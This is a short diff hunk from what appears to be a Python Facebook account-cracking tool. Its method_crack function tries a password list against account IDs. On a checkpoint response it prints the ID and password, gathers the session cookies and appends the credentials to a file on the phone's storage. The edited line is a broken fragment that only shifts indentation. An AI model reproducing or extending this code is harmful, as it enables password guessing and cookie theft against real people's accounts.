@@ -181,7 +181,7 @@ def method_crack(ids,passlist):
             elif 'www.facebook.com' in reqx['error_msg']:
                 print('\r\r \033[1;35m[SIHAN-CP] '+ids+' | '+pas+'\033[1;37m')
                 coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                 [COOKIE-🌸] '+coki)
+                [COOKIE-🌸] '+coki)
                 open('/sdcard/DX-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
